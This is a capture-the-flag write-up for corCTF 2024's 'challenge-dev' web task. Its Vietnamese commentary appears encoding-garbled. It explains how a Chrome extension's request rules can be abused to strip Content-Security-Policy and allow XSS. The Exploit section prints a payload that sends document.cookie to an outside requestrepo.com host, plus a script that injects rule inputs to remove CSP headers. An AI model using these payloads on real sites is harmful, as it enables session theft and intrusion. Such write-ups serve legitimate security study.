---
title: corctf-challenge-dev
description: ''
tags:
  - writeup
  - xss
  - rce
  - lfi
  - csp
  - file-upload
category: web
draft: false
ctf_event: Corctf2024
date: 2023-07-04
---

import Callout from '@/components/mdx/Callout.astro';

Status: Done

## Summary

<Callout type="note" title="Note">
ğŸ’¡

</Callout>

## Description

1. `npx @puppeteer/browsers install chrome@stable`

   Install Chrome with

2. `~/chrome/linux-127.0.6533.72/chrome-linux64/chrome --disable-extensions-except=./extension/ --load=extension=./extension/`

   Start Chrome like this

3. `rm -rf ~/.config/google-chrome-for-testing/`

   Reset the environment with

   Test voi bot local

   ![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled.png)

## Analyst

- Dá»… nhÃ¬n tháº¥y Ä‘oáº¡n code vuln xss. Tuy nhiÃªn pháº§n csp ráº¥t khÃ³ Ä‘á»ƒ bypass
- Ã tÆ°á»Ÿng khÃ¡ láº¡ cá»§a bÃ i nÃ y lÃ  khi bot visit url sáº½ load lÃªn extension Ä‘c setup á»Ÿ manifest
- File manifest nhÆ° sau

![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-1.png)

- CÃ³ tá»•ng cá»™ng 3 file js, trong Ä‘Ã³ ta sáº½ táº­p trung phÃ¢n tÃ­ch 2 file
- Äáº§u tiÃªn file form_handler.js:

![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-2.png)

- Hiá»ƒu qua thÃ¬ file nÃ y sáº½ táº¡o ra 1 tháº» div sau Ä‘Ã³ insert vÃ o document.body
- Äiá»u hay á»Ÿ Ä‘Ã¢y lÃ  trong tháº» div cÃ³ 1 tháº» button khi tháº» nÃ y Ä‘c click thÃ¬ nÃ³ sáº½ láº¥y cÃ¡c thuá»™c tÃ­nh trong tháº» â€œblock-optionsâ€ thá»±c hiá»‡n serialize vÃ  merge vá»›i base_rule. MÃ  base_rule lÃ  rule extension Ä‘Æ°á»£c set trong local.storage.
- File thá»© 2 lÃ  file req_handler.js

![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-3.png)

- Hiá»ƒu qua file nÃ y thÃ¬ má»—i khi 1 tabs Ä‘c load má»›i thÃ¬ sáº½ registerRules() vÃ  sau Ä‘Ã³ sáº½ set rule vÃ o declarativeNetRequest.
- Äá»‘i vá»›i declarativeNetRequest thÃ¬ cÃ³ 1 thÆ°á»£c tÃ­nh type lÃ  modifyHeaders cÃ³ thá»ƒ sá»­ dá»¥ng Ä‘á»ƒ táº¯t Ä‘c csp,â€¦ Tá»« Ä‘Ã³ cÃ³ thá»ƒ thá»±c hiá»‡n Ä‘c XSS. https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest
- Tá»« Ä‘Ã³ Ã½ tÆ°á»Ÿng cá»§a ta lÃ  ta sáº½ viáº¿t má»™t server mÃ  á»Ÿ Ä‘Ã³ sáº½ thÃªm cÃ¡c tháº» input vÃ o tháº» div vÃ o tháº» #condition. Sau Ä‘Ã³ ta sáº½ thá»±c hiá»‡n click button Ä‘á»ƒ [local.storage](http://local.storage) sáº½ set láº¡i cÃ¡c rule, táº¯t Ä‘i csp. Tá»« Ä‘Ã³ ta load láº¡i web vÃ  thá»±c hiá»‡n xss Ä‘á»c document.cookie

![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-4.png)

## Exploit

```python
<script>
        const w = window.open("/")
        w.onload = () => {
            window.location = "https://3nis2z6r.requestrepo.com" + "?" + w.document.cookie
        }
</script>
```

```python

<iframe src="http://localhost:8080/challenge/0333fd79ac4e"></iframe>
<script>
  const sleep = (s) => new Promise((r) => setTimeout(r, s))
  document.addEventListener("DOMContentLoaded", async () => {
    await sleep(1000)
    const condition = document.querySelector("#condition")
    const form = document.querySelector("#submit-btn")

    function createRules(name, value) {
      const inp1 = document.createElement("input")
      inp1.name = name
      inp1.value = value
      condition.appendChild(inp1)
    }

    condition.innerHTML = ""

    const STAGE_MAPPINGS = [
      ["priority", "1"],
      ["action.type", "modifyHeaders"],
      ["action.requestHeaders.0.header", "content-security-policy-report-only"],
      ["action.requestHeaders.0.operation", "remove"],
      ["action.responseHeaders.0.header", "Content-Security-Policy"],
      ["action.responseHeaders.0.operation", "remove"],
      ["condition.urlFilter", "*"],
      ["condition.initiatorDomains.0", "127.0.0.1"],
      ["condition.initiatorDomains.1", "webhook.site"],
      ["condition.initiatorDomains.2", "localhost"],
      ["condition.resourceTypes.0", "main_frame"],
      ["condition.resourceTypes.1", "sub_frame"],
    ]
    for (const i in STAGE_MAPPINGS) {
      const st = STAGE_MAPPINGS[i]
      createRules(st[0], st[1])
    }

    // Dispatch the click event
    form.dispatchEvent(new Event('click'))
    await sleep(2000)
    location.reload()
  })
</script>
```

## Result

![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-5.png)

Äá»c Ä‘á»ƒ hiá»ƒu ká»¹ hÆ¡n vá» bÃ i https://cor.team/posts/corctf-2024-corctf-challenge-dev/
